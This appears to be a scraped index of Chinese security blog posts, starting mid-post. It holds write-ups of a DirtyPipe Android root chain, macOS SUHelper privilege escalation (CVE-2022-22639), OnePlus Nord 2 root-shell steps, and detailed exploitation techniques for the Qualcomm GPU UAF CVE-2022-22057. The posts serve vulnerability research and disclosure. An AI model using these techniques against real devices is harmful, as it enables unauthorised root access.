阶段2 现在位于init进程中。 用 modprobe-payload覆盖/vendor/bin/modprobe。 modprobe 有权加载内核模块。 用内核模块 (mymod.ko) 的内容覆盖/vendor/lib/libstagefright_soft_mp3dec.so。 modprobe 可以从 vendor_file 上下文加载内核模块。 之所以选择这个库，是因为它在 offset=4096 处与 mymod.ko 具有相同的内容，并且无法被dirtypipe 覆盖。 转换到vendor_modprobe上下文然后 fork()/execve(/vendor/bin/modprobe)。 vendor_modprobe (modprobe-payload) 打开（/vendor/lib/libstagefright_soft_mp3dec.so） 文件内容被替换为 mymod.ko finit_module(mymod.ko) mymod.ko 将调用进程的 selinux 域设置为允许。 运行startup-root脚本 获取root。 Information123456789$ sesearch --allow policy-dump|grep module_loadallow init-insmod-sh vendor_kernel_modules:system module_load;allow ueventd vendor_file:system module_load;allow vendor_modprobe vendor_file:system module_load;-rw-r--r-- 1 root root u:object_r:system_lib_file:s0 43168 2009-01-01 09:00 /system/lib/libldacBT_enc.so-rw-r--r-- 1 root root u:object_r:system_lib_file:s0 700392 2009-01-01 09:00 /system/lib64/libc++.so-rw-r--r-- 1 root root u:object_r:vendor_file:s0 71068 2009-01-01 09:00 /vendor/lib/libstagefright_soft_mp3dec.solrwxr-xr-x 1 root shell u:object_r:vendor_file:s0 7 2009-01-01 09:00 /vendor/bin/modprobe -&gt; toolbox finit_module可以加载vendor_kernel_modules或vendor_file。adb shell 或非系统应用程序都无法读取两者。所以内核模块必须由其他 selinux 上下文准备。init上下文可用于此（stage1 有效负载）。 init-insmod-sh 和 ueventd 也应该可用于此技术。（未实施/测试） 添加对设备的支持 libc++.so 中的函数偏移量。 libc++.so 中的empty空间大小。 /vendor/bin/modprobe可用性。 /vendor/lib/libstagefright_soft_mp3dec.so可用性。 必须与 mymod.ko 的内容匹配。 为特定设备构建内核模块。","link":"/2022/03/28/DirtyPipe-Android%E5%88%A9%E7%94%A8/"},{"title":"MacOS SUHelper提权漏洞(CVE-2022-22639)","text":"前言CVE-2022-22639 在iOS 15.4 、iPadOS 15.4、macOS Monterey 12.3上进行了修复。 也影响了iOS，是由trend micro发现的。 漏洞原理suhelpd是macOS中软件更新的辅助守护进程，其中有一个类叫SUHelper，使用IPC提供系统服务。这个进程以root身份运行，并使用特殊权利进行签名，如com.apple.rootless.install。suhelpd可以授予进程绕过系统完整性保护(SIP)限制的能力。 IPC服务suhelpd通过bootstrap_check_in注册名为com.apple.suhelperd的IPC服务。 IPC 服务器提供了 45 个服务例程，但是不知道是怎么逆向出来的。 调用这些服务例程，可以使用OC提供的SUHelperProxy 的类，它封装了所有可以直接使用的 IPC 客户端接口，后面exp也是利用这个来写的。 客户端授权这 45 种服务有一部分可供非特权客户端使用，并且服务器可以通过权限授权机制来验证服务请求是否来自合法客户端。 客户端需要通过 API AuthorizationCreate 生成一个授权对象，然后将其作为外部表单（32 字节数据），将授权对象传递给服务器进行验证。 服务器收到授权对象后，判断是否可以授予客户端特定的权限。在这个阶段，服务器检查客户端的授权对象和uid。 当客户端请求一个特殊的服务例程时，服务器检查特定的权限是否先前被授予给客户端，否则拒绝该请求。 漏洞以此逆向分析 45 个服务例程，然后过滤掉带有验证码的那些，发现了一些名称以“IPC_0_”开头的。对这些例程再进行逆向，发现函数-[SUHelper prepareInstallAssistantWithPath:(NSString *) path]是可利用的。调用者函数 IPC_0_prepareInstallAssistantWithPath 没有验证客户端的权限，而是直接调用了真实的例程。 函数的实现如下，第三个参数(NSString *)是从客户端传过来的路径。 查看内部函数会发现它在第 70 行加载了一个包。 调试发现捆绑路径为 ${Assistant.app}/Contents/Frameworks/OSInstallerSetup.framework。一个重要的发现是${Assistant.app}其实是第三个参数(NSString *)路径，可以完全由客户端控制。 在正常情况下，${Assistant.app}应该是安装macOS XXX.app的真实路径。是从 Apple 服务器下载的 InstallAssistant.pkg 中提取的。但是，我发现用户可以利用此漏洞伪造 ${Assistant.app} 的路径和内容。 似乎找到了一个将任何 dylib 加载到目标进程中以获得 root 特权和特殊权利的原语。但是，无法直接加载自签名 dylib，因为当 SIP 开启时，系统进程默认启用强化运行时，即使它没有使用运行时标志进行签名。但可以将任意 Apple 签名的 dylib 加载到其中，即使它是一个旧的、易受攻击的 dylib。 还有另一个办法，让它加载原始的 OSInstallerSetup.framework。一旦 OSInstallerSetup.framework 被加载，它就会调用函数-[OSISClient _startServer]。在第 103 行，它通过 API SMJobSubmit 启动另一个 IPC 服务 com.apple.install.osinstallersetupd。从第 48 行可以看出，如果当前进程以 root 身份运行，那么新提交的作业也以 root 权限运行在系统域。 当前进程是 suhelperd，以 root 身份运行，作业可执行路径是 toolPath，它位于包 ${Assistant.app}/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd 内。攻击者可以将payload直接放入 toolPath 以实现 root 权限升级。 补丁Apple 已通过macOS Monterey 12.3 安全更新解决了 CVE-2022-22639 问题。这个补丁现在在第 9 行添加了验证代码。","link":"/2022/04/09/MacOS-SUHelper%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2022-22639/"},{"title":"OnePlus Nord 2漏洞 - root shell","text":"背景在手机生产时，厂商需要开启包括root访问权限在内的各种调试功能，在手机上线时关闭这些功能。 但OnePlus Nord 2的官方OxygenOS版本忘记关闭root功能了，这样就导致可以在OnePlus Nord 2的recovery环境获取到一个root shell。 复现1.重启OnePlus Nord 2至recovery模式（也可以不进，因为漏洞出现在恢复模式之前）：同时按下音量和电源按钮，直到在屏幕左下角看到一个小小的“恢复模式”； 2.连接adb； 3.执行adb root命令，可能会超时，但adbd会以root身份运行； 4.执行adb shell whoami可以看到输出为root。 使用场景1.取证，转储设备的每个分区。 2.上传可执行文件到/data/local/tmp并运行，加载执行其他漏洞利用。 3.以root身份调用setprop修改prop值，劫持特权OEM变量。 由于即使没有解锁开发者选项，在恢复模式或正常android中连接usb，也会提示usb调试访问请求，因此这个漏洞不仅仅局限于恢复模式。 影响范围截至2021年11月26日，印度与欧洲的OxygenOS都存在，可能还会影响部分后续固件。","link":"/2021/11/27/OnePlus-Nord-2%E6%BC%8F%E6%B4%9E-root-shell/"},{"title":"Qualcomm GPU驱动UAF漏洞(CVE-2022-22057)","text":"前言又是一篇关于Qualcomm驱动程序的漏洞，然而上一篇关于驱动的漏洞还没去验证呢😮‍💨 今天这一篇是官员Qualcomm GPU的 UAF 漏洞，影响搭载了Snapdragon 888及以上芯片、内核版本为 5.4 及以上的设备，如S21、Galaxy Z Flip3等。 高通的安全公告：Qualcomm security bulletin in May 2022。 为什么要挖GPU驱动漏洞呢？ GPU 驱动中有很多缓解措施； 2021年在野利用的 Android 0Day 漏洞有7个，其中5个是关于 GPU 驱动的； GPU 驱动可以从未信任的应用沙箱中进行访问； 大多数的 GPU 驱动都会处理 GPU 和 CPU 之间的复杂的内存共享逻辑，处理精心制作的恶意代码将导致任意内存读写。由于攻击者滥用GPU 内存管理代码，将导致内存损坏难以检测，以及对现有的缓解措施免疫； 这里有两个滥用 GPU opcode 的例子：Guang Gong 和 Ben Hawkes。 漏洞信息漏洞是在Qualcomm msm 5.4 kernel 中引入的，增加了kgsl timeline特性和一些ioctl。msm 5.4 内核对内核图形支持层（kgsl）驱动程序（位于drivers/gpu/msm下）进行了一些相当重要的重构，并引入了一些新功能。就是这些新功能和重构，导致了新的安全问题。其中大部分是在内部发现并修复的，然后在公告中作为安全问题公开披露。 kgsl_timeline 对象可以通过IOCTL_KGSL_TIMELINE_CREATE 和 IOCTL_KGSL_TIMELINE_DESTROY进行创建和销毁。 kgsl_timeline对象在其 fences字段中存储了一个 dma_fence 对象链表。使用IOCTL_KGSL_TIMELINE_FENCE_GET 和 IOCTL_KGSL_TIMELINE_WAIT向链表中添加dma_fence对象。添加的dma_fence对象是refcounted对象，dma_fence_put方法用于减少它们的refcount。 有趣的是， timeline-&gt;fences 并没有真的持有一个fences的refcount。反之，为了避免 timeline-&gt;fences 中的 dma_fence 被释放，使用了一个自定义的 release 函数： timeline_fence_release ，在dma_fence被释放之前， timeline_fence_release 从 timeline-&gt;fences 中移除该dma_fence。 当存储在 kgsl_timeline::fences 中的 dma_fence 的refcount减少为0时，方法 timeline_fence_release 被调用，以从 kgsl_timeline::fences 中移除 dma_fence ，然后调用 dma_fence_free 方法释放 dma_fence。 123456789101112131415161718static void timeline_fence_release(struct dma_fence *fence){ ... spin_lock_irqsave(&amp;timeline-&gt;fence_lock, flags); /* If the fence is still on the active list, remove it */ list_for_each_entry_safe(cur, temp, &amp;timeline-&gt;fences, node) { if (f != cur) continue; list_del_init(&amp;f-&gt;node); //&lt;----- 1. Remove fence break; } spin_unlock_irqrestore(&amp;timeline-&gt;fence_lock, flags); ... kgsl_timeline_put(f-&gt;timeline); dma_fence_free(fence); //&lt;------- 2. frees the fence} 尽管移除操作被timeline-&gt;fence_lock所保护，IOCTL_KGSL_TIMELINE_DESTROY仍然可以在 dma_fence 的refcount减少为0时，从 fences 中移除前，获取它的一个引用。 1234567891011121314151617181920long kgsl_ioctl_timeline_destroy(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data){ ... spin_lock(&amp;timeline-&gt;fence_lock); //&lt;------------- a. list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node) dma_fence_get(&amp;fence-&gt;base); list_replace_init(&amp;timeline-&gt;fences, &amp;temp); spin_unlock(&amp;timeline-&gt;fence_lock); spin_lock_irq(&amp;timeline-&gt;lock); list_for_each_entry_safe(fence, tmp, &amp;temp, node) { //&lt;----- b. dma_fence_set_error(&amp;fence-&gt;base, -ENOENT); dma_fence_signal_locked(&amp;fence-&gt;base); dma_fence_put(&amp;fence-&gt;base); } spin_unlock_irq(&amp;timeline-&gt;lock); ...} 在 kgsl_ioctl_timeline_destroy中，销毁一个timeline之前，先将timeline-&gt;fences中的fences拷贝到temp中，然后从timeline-&gt;fences中删除（a）。由于timeline-&gt;fences没有保留额外的fence引用，refcount将被增加以阻止它们在temp中被释放。同样的，这里对 timeline-&gt;fences 的操作也受到timeline-&gt;fence_lock的保护。但是，当到达（a）时，fence的refcount已经为0了，方法 timeline_fence_release 还没有将其从 kgsl_timeline::fences 中移除时， dma_fence 将被移动到temp中，尽管此时它的引用增加了，但是也已经晚了，因为，随后方法 timeline_fence_release 将从 kgsl_timeline::fences 中移除它，无论refcount的值是多少。按照以下流程，UAF 将在（b）处触发。 如上图所示，这是竞争的流程，通过在 timeline-&gt;fence中添加大量的 dma_fence ，可以增加kgsl_ioctl_timeline_destroy代码块运行的时间。如果在线程2中将 timeline-&gt;fence中最后一个 dma_fence 的refcount减少为0，同时保持线程1继续运行，我们可以在线程1的 dma_fence_get 将refcount加1前，调用 timeline_fence_release 。因为线程2也需要等待 timeline-&gt;fence_lock，它只有等线程1结束，才能从 kgsl_timeline::fences 中移除 dma_fence 。到那时， timeline-&gt;fence中所有的 dma_fence 都已经移动到temp中了。这就意味着，当线程2运行时， timeline-&gt;fence是一个空的链表，然后执行流程将很快到达 dma_fence_free。 简而言之，只要在 timeline-&gt;fence中放置足够的 dma_fence ，可以在kgsl_ioctl_timeline_destroy将 timeline-&gt;fence中 dma_fence 移动到temp的过程中，创造一个很大的竞争窗口，只要将 timeline-&gt;fence中最后一个 dma_fence 的refcount减少为0，就可以触发UAF。 缓解措施利用这个bug并不复杂，但是，有很多漏洞缓解措施，kCFI (Kernel Control Flow Integrity) 和 variable initialization （这些在4.x内核中是关闭的，但是5.x内核全部开启了），还有 Samsung RKP (Realtime Kernel Protection) 。 kCFIkCFI可以说是最容易被绕过的缓解措施，特别是在与三星管理程序一起使用时，它保护了内核中许多重要的内存区域。kCFI通过限制动态调用点可以使用函数签名跳转到的位置来防止控制流被劫持。例如，在当前的漏洞中，dma_fence被释放后，函数dma_fence_signal_locked被调用： 12345678910111213long kgsl_ioctl_timeline_destroy(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data){ ... spin_lock_irq(&amp;timeline-&gt;lock); list_for_each_entry_safe(fence, tmp, &amp;temp, node) { dma_fence_set_error(&amp;fence-&gt;base, -ENOENT); dma_fence_signal_locked(&amp;fence-&gt;base); //&lt;---- free'd fence is used dma_fence_put(&amp;fence-&gt;base); } spin_unlock_irq(&amp;timeline-&gt;lock); ...} dma_fence_signal_locked将调用 cur-&gt;func ，该函数是fence-&gt;cb_list列表中的一个元素： 123456789int dma_fence_signal_locked(struct dma_fence *fence){ ... list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) { INIT_LIST_HEAD(&amp;cur-&gt;node); cur-&gt;func(fence, cur); } ...} 如果没有kCFI的话，已释放的 fence 将可以被fake object代替，意味着，包括cb_list和func，所有都是假的。只要绕过了KASLR，利用就十分简单了，如这个利用。但是由于kCFI，现在替换func的函数类型只能为 dma_fence_func_t。 之前有关于如何绕过 Samsung 控制流完整性校验（JOPP, jump-oriented programming prevention）的方法，但是对kCFI没什么作用，绕过kCFI的常见方法是通过double free去劫持释放的链表，然后使用Kernel Space Mirroring Attack (KSMA)，但是，这种方法需要大量的时间，如[Three dark clouds over the Android kernel](https://github.com/2freeman/Slides/blob/main/PoC-2020-Three Dark clouds over the Android kernel.pdf) 和 Typhoon Mangkhut: One-click remote universal root formed with two vulnerabilities 。 这个bug也能提供double free，就是当 dma_fence_put 在 fence 被释放后调用时： 12345678910111213long kgsl_ioctl_timeline_destroy(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data){ ... spin_lock_irq(&amp;timeline-&gt;lock); list_for_each_entry_safe(fence, tmp, &amp;temp, node) { dma_fence_set_error(&amp;fence-&gt;base, -ENOENT); dma_fence_signal_locked(&amp;fence-&gt;base); dma_fence_put(&amp;fence-&gt;base); //&lt;----- free'd fence can be freed again } spin_unlock_irq(&amp;timeline-&gt;lock); ...} 上述做法减少了假 fence 对象的refcount，可以控制为1，这样假 fence 就会再次被释放。然而，这并不能应用KSMA，因为这需要覆盖swapper_pg_dir数据结构，而这个结构是受三星管理程序保护的。 Variable initialization从Android 11开始，内核可以通过启用各种内核构建标志来实现自动变量初始化。例如，以下是Z Flip3的构建配置： 12345678910# Memory initialization#CONFIG_CC_HAS_AUTO_VAR_INIT_PATTERN=yCONFIG_CC_HAS_AUTO_VAR_INIT_ZERO=y# CONFIG_INIT_STACK_NONE is not set# CONFIG_INIT_STACK_ALL_PATTERN is not setCONFIG_INIT_STACK_ALL_ZERO=yCONFIG_INIT_ON_ALLOC_DEFAULT_ON=y# CONFIG_INIT_ON_FREE_DEFAULT_ON is not set# end of Memory initialization 这个特征除了保护未初始化的变量以外，还使得替换对象变得困难。特别是，它不再可能执行部分对象替换，即只替换对象的第一个字节，而对象的其余部分仍然有效。如堆喷，Mitigations are attack surface, too将不再可能。 这个特性将使得这个bug不能进行堆喷。 kfree_rcu这不是一个缓解措施，之所以提，是因为它有些类似已提出的 UAF 缓解措施的作用。这个bug中， fence 被 dma_fence_free 释放，不同于常规的 kfree，这里是使用 kfree_rcu。简单来说，kfree_rcu并不直接释放掉对象，只是在遇到某些情况时再进行释放。这有点像一个延迟释放，在对象被释放的时间上引入了一个不确定性（这和 Scudo分配器的UAF缓解措施类似），这种不确定性对这个bug的利用还是很有阻碍（竞争窗口很紧张）的。 然而，有许多操纵竞争窗口大小的原语，比如Racing against the clock—hitting a tiny kernel race window和[Exploiting race conditions on (ancient) Linux](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019 - Exploiting race conditions on Linux.pdf)中的技术，（两者都是由Jann Horn编写的，较早的技术被用于利用当前的bug）任何紧张的竞争窗口都可以被做得足够大，以允许由kfree_rcu引起的延迟，以及随后的对象替换。 Samsung RKP (Realtime Kernel Protection)RKP保护内存不被写入，这可以防止进程覆盖自己的证书成为root，也可以保护SELinux设置不被覆盖。它还可以防止内核代码区和其他重要对象，如内核页表，被覆盖。不过在实践中，一旦实现了任意的内核内存读写（受RKP限制），就有办法绕过这些限制。例如，SELinux规则可以通过覆盖avc缓存来修改（例如，见Valentina Palmiotti的这个利用），而获得root可以通过hijacking other processes that run as root实现。 在这个bug中，RKP与kCFI合作，防止任意函数调用。 漏洞利用Adding dma_fence to timeline-&gt;fences有两个选项可以将dma_fence对象添加到kgsl_timeline中，第一个是使用IOCTL_KGSL_TIMELINE_FENCE_GET： 123456789101112131415long kgsl_ioctl_timeline_fence_get(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data){ ... timeline = kgsl_timeline_by_id(device, param-&gt;timeline); ... fence = kgsl_timeline_fence_alloc(timeline, param-&gt;seqno); //&lt;----- dma_fence created and added to timeline ... sync_file = sync_file_create(fence); if (sync_file) { fd_install(fd, sync_file-&gt;file); param-&gt;handle = fd; } ...} kgsl_timeline_fence_alloc创建一个dma_fence，并将其添加到timeline上。然后调用者得到一个与dma_fence对应的sync_file的文件描述符。当sync_file被关闭时，dma_fence的refcount被减少到0。 第二个是 IOCTL_KGSL_TIMELINE_WAIT： 123456789101112131415161718long kgsl_ioctl_timeline_wait(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data){ ... fence = kgsl_timelines_to_fence_array(device, param-&gt;timelines, param-&gt;count, param-&gt;timelines_size, (param-&gt;flags == KGSL_TIMELINE_WAIT_ANY)); //&lt;------ dma_fence created and added to timeline ... if (!timeout) ret = dma_fence_is_signaled(fence) ? 0 : -EBUSY; else { ret = dma_fence_wait_timeout(fence, true, timeout); //&lt;----- 1. ... } dma_fence_put(fence); ...} kgsl_timelines_to_fence_array创建dma_fence对象，并将其添加到timeline上。如果指定了一个 timeout ，那么该调用将进入dma_fence_wait_timeout（路径标记为1）进行等待，直到超时或线程收到中断。在dma_fence_wait_timeout结束后，dma_fence_put被调用，以将dma_fence的refcount减少到0，释放被添加到timeline上的dma_fence。 虽然IOCTL_KGSL_TIMELINE_FENCE_GET乍看之下似乎更容易使用和控制，但实际上，关闭sync_file产生的开销使得销毁dma_fence的时间不那么可靠。因此，对于这个bug，这里使用IOCTL_KGSL_TIMELINE_FENCE_GET来创建和添加持久化的dma_fence对象来填充timeline-&gt;fences列表，以扩大竞争窗口，而用于UAF漏洞的最后一个dma_fence对象是使用IOCTL_KGSL_TIMELINE_WAIT添加的，当发送中断信号给调用IOCTL_KGSL_TIMELINE_WAIT的线程，它就被释放。 Widening the tiny race window为了利用这个漏洞，需要在以下代码块中标记的第一个竞争窗口内删除kgsl_timeline的 fences 列表中的dma_fence的refcount： 123456789101112131415161718192021long kgsl_ioctl_timeline_destroy(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data){ //BEGIN OF FIRST RACE WINDOW spin_lock(&amp;timeline-&gt;fence_lock); list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node) dma_fence_get(&amp;fence-&gt;base); list_replace_init(&amp;timeline-&gt;fences, &amp;temp); spin_unlock(&amp;timeline-&gt;fence_lock); //END OF FIRST RACE WINDOW //BEGIN OF SECOND RACE WINDOW spin_lock_irq(&amp;timeline-&gt;lock); list_for_each_entry_safe(fence, tmp, &amp;temp, node) { dma_fence_set_error(&amp;fence-&gt;base, -ENOENT); dma_fence_signal_locked(&amp;fence-&gt;base); dma_fence_put(&amp;fence-&gt;base); } spin_unlock_irq(&amp;timeline-&gt;lock); //END OF SECOND RACE WINDOW ...} 如前所述，通过向timeline-&gt;fences添加大量的dma_fence对象，可以扩大第一个竞争窗口，这使得在这个窗口内很容易触发refcount的减少。然而，为了利用这个错误，下面的代码以及对象替换必须在第二个竞争窗口结束前完成： 1234567891011spin_lock_irqsave(&amp;timeline-&gt;fence_lock, flags);list_for_each_entry_safe(cur, temp, &amp;timeline-&gt;fences, node) { if (f != cur) continue; list_del_init(&amp;f-&gt;node); break;}spin_unlock_irqrestore(&amp;timeline-&gt;fence_lock, flags);trace_kgsl_timeline_fence_release(f-&gt;timeline-&gt;id, fence-&gt;seqno);kgsl_timeline_put(f-&gt;timeline);dma_fence_free(fence); 如前所述，由于spin_lock的存在，在第一个竞争窗口结束之前，上述代码不能执行，但在运行这段代码时，timeline-&gt;fence已经被清空，所以循环会很快运行。然而，由于dma_fence_free使用了kfree_rcu，实际释放fence的时间被推迟了。这使得我们不可能在第二个竞争窗口结束前替换已释放的fence，除非能操纵调度器。这里使用[Exploiting race conditions on (ancient) Linux](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019 - Exploiting race conditions on Linux.pdf)，另一个Android漏洞中也使用了这项技术，以扩大这个竞争窗口。 下面是关于这项技术的概述： 为了确保每个任务（线程或进程）有公平的CPU时间片，Linux内核调度程序可以中断一个正在运行的任务，并将其搁置，以便另一个任务可以运行。这种中断和停止任务的行为被称为抢占（被中断的任务被抢占）。一个任务也可以把自己搁置起来，让另一个任务运行，比如当它在等待一些I/O输入时，或者当它调用sched_yield()时。在这种情况下，我们说该任务是自愿抢占的。抢占也可以发生在系统调用内部，比如ioctl调用，在Android上，除了一些关键区域（比如持有自旋锁），任务可以被抢占。这种行为可以通过使用CPU亲和力和任务优先级来操纵。 默认情况下，一个任务以SCHED_NORMAL的优先级运行，但也可以使用sched_setscheduler调用（或线程的pthread_setschedparam）设置一个较低的优先级SCHED_IDLE。此外，还可以用sched_setaffinity将其固定在一个CPU上，这将只允许它在一个特定的CPU上运行。通过将两个任务（一个具有SCHED_NORMAL优先级，另一个具有SCHED_IDLE优先级）固定在同一个CPU上，可以控制抢占的时间，如下所示： 首先让SCHED_NORMAL任务执行一个系统调用，导致它暂停和等待。例如，它可以从一个没有数据进入的管道中读取数据，然后它将等待更多的数据，并主动抢占自己的位置，以便SCHED_IDLE任务可以运行。 当SCHED_IDLE任务正在运行时，向SCHED_NORMAL任务一直在等待的管道发送一些数据。这将唤醒SCHED_NORMAL任务，使其抢占SCHED_IDLE任务，由于任务的优先级，SCHED_IDLE任务将被抢占并搁置。 然后SCHED_NORMAL任务可以运行一个繁忙循环，以防止SCHED_IDLE任务被唤醒。 在这个bug的漏洞利用中，该技术使用如下所示： 在一个线程上运行IOCTL_KGSL_TIMELINE_WAIT，向kgsl_timeline添加dma_fence对象。将超时设置为一个大值，并使用 sched_setaffinity 将这个任务固定在一个 CPU 上，称之为 SPRAY_CPU。一旦dma_fence对象被添加，这个任务就会变成空闲状态，直到它收到一个中断。 设置一个SCHED_NORMAL任务，并将其固定在另一个CPU上（DESTROY_CPU），该 CPU 监听一个空管道。这将导致这个任务最初变得空闲，并允许DESTROY_CPU运行一个低优先级的任务。一旦空管道收到一些数据，这个任务就会运行一个繁忙的循环。 在DESTROY_CPU上设置一个SCHED_IDLE任务，它将运行IOCTL_KGSL_TIMELINE_DESTROY来销毁步骤一中加入dma_fence的timeline。由于第二步中设置的任务正在等待空管的响应，DESTROY_CPU将首先运行这个任务。 向运行IOCTL_KGSL_TIMELINE_WAIT的任务发送一个中断。然后，在IOCTL_KGSL_TIMELINE_DESTROY在第一个竞争窗口内运行时，该任务将解除封锁并释放dma_fence。 写入SCHED_NORMAL任务正在监听的空管道。这将导致SCHED_NORMAL任务抢占SCHED_IDLE任务。一旦它成功地抢占了任务，DESTROY_CPU将运行繁忙循环，导致SCHED_IDLE任务被搁置。 由于运行IOCTL_KGSL_TIMELINE_DESTROY的SCHED_IDLE任务被搁置，现在有足够的时间来克服kfree_rcu引入的延迟，并允许步骤4中的dma_fence被释放和替换。之后，恢复IOCTL_KGSL_TIMELINE_DESTROY，这样后续的操作将在现在被释放和替换的dma_fence对象上执行。 这里需要注意的是，因为在线程持有自旋锁的时候不能发生抢占，所以IOCTL_KGSL_TIMELINE_DESTROY只能在自旋锁之间的窗口期抢占，如下所示： 123456789101112131415long kgsl_ioctl_timeline_destroy(struct kgsl_device_private *dev_priv, unsigned int cmd, void *data){ spin_lock(&amp;timeline-&gt;fence_lock); list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node) ... spin_unlock(&amp;timeline-&gt;fence_lock); //Preemption window spin_lock_irq(&amp;timeline-&gt;lock); list_for_each_entry_safe(fence, tmp, &amp;temp, node) { ... } spin_unlock_irq(&amp;timeline-&gt;lock); ...} 虽然上面的抢占窗口看起来非常小，但在实践中，只要SCHED_NORMAL任务试图在第一个自旋锁被持有时抢占运行IOCTL_KGSL_TIMELINE_DESTROY的SCHED_IDLE任务，一旦自旋锁被释放，抢占就会发生，这使得在正确的时间抢占IOCTL_KGSL_TIMELINE_DESTROY更容易成功。 下图红色块表示持有自旋锁的区域，因此不可能抢占，虚线表示闲置的任务： 对于对象的替换，使用sendmsg，这是一种标准的方法，可以用受控数据替换linux内核中的已释放的对象。下面是假对象是如何被使用的： 1234567spin_lock_irq(&amp;timeline-&gt;lock);list_for_each_entry_safe(fence, tmp, &amp;temp, node) { dma_fence_set_error(&amp;fence-&gt;base, -ENOENT); dma_fence_signal_locked(&amp;fence-&gt;base); dma_fence_put(&amp;fence-&gt;base);}spin_unlock_irq(&amp;timeline-&gt;lock); 三个不同的函数，dma_fence_set_error、dma_fence_signal_locked和dma_fence_put将被调用，参数为fence。函数dma_fence_set_error将向fence对象写一个错误代码，这可能对合适的对象替换有用，但对sendmsg对象替换没有用，函数dma_fence_signal_locked如下： 1234567891011121314151617int dma_fence_signal_locked(struct dma_fence *fence){ ... if (unlikely(test_and_set_bit(DMA_FENCE_FLAG_SIGNALED_BIT, //&lt;-- 1. &amp;fence-&gt;flags))) return -EINVAL; /* Stash the cb_list before replacing it with the timestamp */ list_replace(&amp;fence-&gt;cb_list, &amp;cb_list); //&lt;-- 2. ... list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) { //&lt;-- 3. INIT_LIST_HEAD(&amp;cur-&gt;node); cur-&gt;func(fence, cur); } return 0;} 首先检查fence-&gt;flags（1）：如果DMA_FENCE_FLAG_SIGNALED_BIT标志被设置，那么fence已经被信号化，函数退出。如果fence没有被发出信号，那么会调用list_replace来移除fence-&gt;cb_list中的对象，并将其放入临时cb_list中（2） 之后，存储在cb_list中的函数被调用（3）。正如在 kCFI 一节中解释的那样，因为CFI的缓解，这将只允许调用某种类型的函数；此外，在这个阶段，由于对函数地址一无所知，所以如果走到达这个路径，很可能只会让内核崩溃。所以，只能在假对象中设置DMA_FENCE_FLAG_SIGNALED_BIT标志，让dma_fence_signal_locked提前退出。 只剩下了、dma_fence_put函数，它减少fence的refcount，并在refcount达到0时调用dma_fence_release： 12345678void dma_fence_release(struct kref *kref){ ... if (fence-&gt;ops-&gt;release) fence-&gt;ops-&gt;release(fence); else dma_fence_free(fence);} 如果调用dma_fence_release，那么最终会检查fence-&gt;ops并调用fence-&gt;ops-&gt;release。这就有两个问题。首先，fence-&gt;ops需要指向有效的内存，否则解除引用就会失败，即使解除引用成功，fence-&gt;ops-&gt;release要么需要为零，要么必须是一个适当类型的函数的地址。 所有这些给了两个选择。可以遵循标准路径：尝试用另一个对象替换栅栏对象，或者尝试利用dma_fence_put和dma_fence_set_error提供的有限的写原语，同时希望仍然可以控制flags和refcount字段以避免dma_fence_signal_locked或dma_fence_release使内核崩溃。 The ultimate fake object store在利用另一个错误时，作者发现了软件输入输出转换旁观缓冲区（SWIOTLB），这是一个在启动时很早就分配的内存区域。因此，SWIOTLB的物理地址是非常固定的，只取决于硬件配置。此外，由于该内存位于 “低内存 “区域（Android设备似乎没有 “高内存 “区域），并且不在内核镜像中，因此虚拟地址只是带有固定偏移的物理地址（对细节感兴趣的读者可以关注kmap函数的实现）: 1234567#define __virt_to_phys_nodebug(x) ({ \\ phys_addr_t __x = (phys_addr_t)(__tag_reset(x)); \\ __is_lm_address(__x) ? __lm_to_phys(__x) : __kimg_to_phys(__x); \\})#define __is_lm_address(addr) (!(((u64)addr) &amp; BIT(vabits_actual - 1)))#define __lm_to_phys(addr) (((addr) + physvirt_offset)) 上述定义来自arch/arm64/include/asm/memory.h，它是Android的相关实现。用于翻译地址的变量physvirt_offset是在arm64_memblock_init中设置的一个固定常数： 12345678void __init arm64_memblock_init(void){... memstart_addr = round_down(memblock_start_of_DRAM(), ARM64_MEMSTART_ALIGN); physvirt_offset = PHYS_OFFSET - PAGE_OFFSET; ...} 除此之外，SWIOTLB中的内存可以通过adsp驱动访问，而adsp驱动是可以从一个不受信任的应用程序中到达的，所以这似乎是一个存储假对象和重定向假指针的好地方。然而，在5.x版本的内核中，SWIOTLB只有在用CONFIG_DMA_ZONE32标志编译内核时才会被分配，而Z Flip3 不是这种情况。 然而，还有更好的东西。SWIOTLB的早期分配给了它一个可预测的地址，这促使作者检查启动日志，看看是否有其他的内存区域在启动过程中被提前分配，结果发现确实有其他的内存区域在启动过程中被很早地分配。 12345678910&lt;6&gt;[ 0.000000] [0: swapper: 0] Reserved memory: created CMA memory pool at 0x00000000f2800000, size 212 MiB&lt;6&gt;[ 0.000000] [0: swapper: 0] OF: reserved mem: initialized node secure_display_region, compatible id shared-dma-pool...&lt;6&gt;[ 0.000000] [0: swapper: 0] OF: reserved mem: initialized node user_contig_region, compatible id shared-dma-pool&lt;6&gt;[ 0.000000] [0: swapper: 0] Reserved memory: created CMA memory pool at 0x00000000f0c00000, size 12 MiB&lt;6&gt;[ 0.578613] [7: swapper/0: 1] platform soc:qcom,ion:qcom,ion-heap@22: assigned reserved memory node sdsp_region...&lt;6&gt;[ 0.578829] [7: swapper/0: 1] platform soc:qcom,ion:qcom,ion-heap@26: assigned reserved memory node user_contig_region... 上面的保留内存区域似乎是用于分配ion缓冲区的内存池。 在Android上，ion_allocator被用来分配用于DMA（直接内存访问）的内存区域，允许内核驱动和用户空间进程共享同一底层内存。未受信任的应用程序可以通过/dev/ion文件访问ion分配器，ION_IOC_ALLOC ioctl可以用来分配一个ion缓冲区。该ioctl向用户返回一个新的文件描述符，然后可以在mmap syscall中使用，将ion缓冲区的后备存储映射到用户空间。 